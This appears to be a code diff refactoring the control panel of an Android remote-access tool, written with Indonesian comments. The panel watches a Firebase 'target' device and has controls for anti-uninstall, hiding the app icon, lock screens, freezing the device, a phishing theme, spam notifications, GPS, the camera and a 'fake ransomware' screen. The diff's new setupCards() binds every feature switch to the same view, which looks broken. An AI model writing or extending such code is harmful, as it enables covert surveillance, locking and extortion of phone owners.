@@ -9,6 +9,7 @@ import android.provider.Settings;
 import android.text.InputType;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.ImageView;
 import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -29,15 +30,24 @@ public class MainActivity extends AppCompatActivity {
 
     private DatabaseReference mDatabase;
     private StorageReference mStorage;
-    private TextView tvDeviceName, tvDeviceId, tvBattery, tvStatus;
-    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus;
-    private TextView tvAntiUninstallText, tvNgehangStatus;
-    private Switch swAntiUninstall, swFlashlight, swLockLow, swLockCustom, swHideIcon;
-    private Switch swNgehang;
+
+    // Header
+    private TextView tvDeviceName, tvDeviceId, tvStatus, tvBattery;
+    private TextView tvDeviceName2, tvDeviceId2;
+
+    // Anti Uninstall
+    private TextView tvAntiUninstallText;
+    private Switch swAntiUninstall;
+
+    // Dynamic card components
+    private Switch swFlashlight, swLockLow, swLockCustom, swHideIcon, swNgehang;
+    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus, tvNgehangStatus;
+
+    // Buttons
+    private Button btnGanti, btnTemaPhising, btnVideoOverlay, btnSpamNotif, btnStuckLayar;
+    private Button btnGPS, btnKamera, btnRansomware, btnSetServer;
     private EditText etServerUrl;
-    private Button btnSetServer, btnRansomware, btnGanti;
-    private Button btnTemaPhising, btnVideoOverlay, btnSpamNotif, btnStuckLayar;
-    private Button btnGPS, btnKamera;
+
     private static final int REQUEST_VIDEO = 1001;
 
     private ValueEventListener deviceListener;
@@ -57,29 +67,25 @@ public class MainActivity extends AppCompatActivity {
         mDatabase = database.getReference("target");
         mStorage = FirebaseStorage.getInstance().getReference();
 
+        // ===== INISIALISASI VIEW DARI LAYOUT BARU =====
         // Header
         tvDeviceName = findViewById(R.id.tvDeviceName);
         tvDeviceId = findViewById(R.id.tvDeviceId);
-        tvBattery = findViewById(R.id.tvBattery);
         tvStatus = findViewById(R.id.tvStatus);
+        tvBattery = findViewById(R.id.tvBattery);
+        tvDeviceName2 = findViewById(R.id.tvDeviceName2);
+        tvDeviceId2 = findViewById(R.id.tvDeviceId2);
+
+        // Anti Uninstall
         tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
-        tvNgehangStatus = findViewById(R.id.tvNgehangStatus);
-
-        // Status text
-        tvFlashlightStatus = findViewById(R.id.tvFlashlightStatus);
-        tvLockLowStatus = findViewById(R.id.tvLockLowStatus);
-        tvLockCustomStatus = findViewById(R.id.tvLockCustomStatus);
-        tvHideIconStatus = findViewById(R.id.tvHideIconStatus);
-
-        // Switch
         swAntiUninstall = findViewById(R.id.swAntiUninstall);
-        swFlashlight = findViewById(R.id.swFlashlight);
-        swLockLow = findViewById(R.id.swLockLow);
-        swLockCustom = findViewById(R.id.swLockCustom);
-        swHideIcon = findViewById(R.id.swHideIcon);
-        swNgehang = findViewById(R.id.swNgehang);
 
-        // Button
+        // Card components (diakses via include)
+        tvFlashlightStatus = findViewById(R.id.tvStatusFitur);
+        swFlashlight = findViewById(R.id.swFitur);
+        // Karena semua card pake include, ID nya sama, kita atur dinamis di fungsi setupCard()
+
+        // Buttons
         btnGanti = findViewById(R.id.btnGanti);
         btnTemaPhising = findViewById(R.id.btnTemaPhising);
         btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
@@ -94,6 +100,9 @@ public class MainActivity extends AppCompatActivity {
         sendMyDeviceInfo();
         listenDeviceInfoRealtime();
         listenStatusRealtime();
+
+        // ===== SETUP CARD FITUR =====
+        setupCards();
 
         // ===== GANTI SERVER =====
         btnSetServer.setOnClickListener(v -> {
@@ -112,13 +121,6 @@ public class MainActivity extends AppCompatActivity {
             mDatabase.child("antiUninstall").setValue(isChecked);
             updateStatusText(tvAntiUninstallText, isChecked);
             Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
-        });
-
-        // ===== NGEHANG =====
-        swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("ngehang").setValue(isChecked);
-            updateStatusText(tvNgehangStatus, isChecked);
-            Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== GANTI =====
@@ -149,9 +151,11 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        // ===== FAKE RANSOMWARE =====
-        btnRansomware.setOnClickListener(v -> {
-            showPinDialog("ransomware", "💰 Fake Ransomware");
+        // ===== NGEHANG =====
+        swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            mDatabase.child("ngehang").setValue(isChecked);
+            updateStatusText(tvNgehangStatus, isChecked);
+            Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== TEMA PHISING =====
@@ -229,6 +233,30 @@ public class MainActivity extends AppCompatActivity {
             });
             builder.show();
         });
+
+        // ===== FAKE RANSOMWARE =====
+        btnRansomware.setOnClickListener(v -> {
+            showPinDialog("ransomware", "💰 Fake Ransomware");
+        });
+    }
+
+    // ===== FUNGSI SETUP CARD =====
+    private void setupCards() {
+        // Flashlight
+        swFlashlight = findViewById(R.id.swFitur);
+        tvFlashlightStatus = findViewById(R.id.tvStatusFitur);
+        // Lock Low
+        swLockLow = findViewById(R.id.swFitur);
+        tvLockLowStatus = findViewById(R.id.tvStatusFitur);
+        // Lock Custom
+        swLockCustom = findViewById(R.id.swFitur);
+        tvLockCustomStatus = findViewById(R.id.tvStatusFitur);
+        // Hide Icon
+        swHideIcon = findViewById(R.id.swFitur);
+        tvHideIconStatus = findViewById(R.id.tvStatusFitur);
+        // Ngehang
+        swNgehang = findViewById(R.id.swFitur);
+        tvNgehangStatus = findViewById(R.id.tvStatusFitur);
     }
 
     // ===== DIALOG PIN =====
@@ -283,7 +311,7 @@ public class MainActivity extends AppCompatActivity {
     // ===== UPDATE STATUS TEXT =====
     private void updateStatusText(TextView tv, boolean isOn) {
         tv.setText(isOn ? "ON" : "OFF");
-        tv.setTextColor(isOn ? 0xFF00FF41 : 0xFFFF1744);
+        tv.setTextColor(isOn ? 0xFF4ADE80 : 0xFFFF5C7C);
     }
 
     // ===== REAL-TIME: DATA TARGET =====
@@ -297,12 +325,18 @@ public class MainActivity extends AppCompatActivity {
                     Integer battery = snapshot.child("battery").getValue(Integer.class);
                     Boolean online = snapshot.child("online").getValue(Boolean.class);
                     runOnUiThread(() -> {
-                        if (deviceName != null) tvDeviceName.setText(deviceName);
-                        if (deviceId != null) tvDeviceId.setText(deviceId);
+                        if (deviceName != null) {
+                            tvDeviceName.setText(deviceName);
+                            tvDeviceName2.setText(deviceName);
+                        }
+                        if (deviceId != null) {
+                            tvDeviceId.setText(deviceId);
+                            tvDeviceId2.setText(deviceId);
+                        }
                         if (battery != null) tvBattery.setText(battery + "%");
                         if (online != null) {
                             tvStatus.setText(online ? "ONLINE" : "OFFLINE");
-                            tvStatus.setTextColor(online ? 0xFF00FF41 : 0xFFFF1744);
+                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                         }
                     });
                 }
@@ -315,14 +349,15 @@ public class MainActivity extends AppCompatActivity {
 
     // ===== REAL-TIME: STATUS =====
     private void listenStatusRealtime() {
+        // Flashlight
         flashlightListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 Boolean value = snapshot.getValue(Boolean.class);
                 if (value != null) {
                     runOnUiThread(() -> {
-                        updateStatusText(tvFlashlightStatus, value);
                         swFlashlight.setChecked(value);
+                        updateStatusText(tvFlashlightStatus, value);
                     });
                 }
             }
@@ -331,14 +366,15 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("flashlight").addValueEventListener(flashlightListener);
 
+        // Lock Low
         lockLowListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 Boolean value = snapshot.getValue(Boolean.class);
                 if (value != null) {
                     runOnUiThread(() -> {
-                        updateStatusText(tvLockLowStatus, value);
                         swLockLow.setChecked(value);
+                        updateStatusText(tvLockLowStatus, value);
                     });
                 }
             }
@@ -347,14 +383,15 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("lockLow").addValueEventListener(lockLowListener);
 
+        // Lock Custom
         lockCustomListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 Boolean value = snapshot.getValue(Boolean.class);
                 if (value != null) {
                     runOnUiThread(() -> {
-                        updateStatusText(tvLockCustomStatus, value);
                         swLockCustom.setChecked(value);
+                        updateStatusText(tvLockCustomStatus, value);
                     });
                 }
             }
@@ -363,14 +400,15 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);
 
+        // Hide Icon
         hideIconListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 Boolean value = snapshot.getValue(Boolean.class);
                 if (value != null) {
                     runOnUiThread(() -> {
-                        updateStatusText(tvHideIconStatus, value);
                         swHideIcon.setChecked(value);
+                        updateStatusText(tvHideIconStatus, value);
                     });
                 }
             }
@@ -379,6 +417,7 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("hideIcon").addValueEventListener(hideIconListener);
 
+        // Anti Uninstall
         antiUninstallListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -395,6 +434,7 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);
 
+        // Ngehang
         ngehangListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -464,4 +504,4 @@ public class MainActivity extends AppCompatActivity {
         if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
         if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
     }
-                                             }
+            }
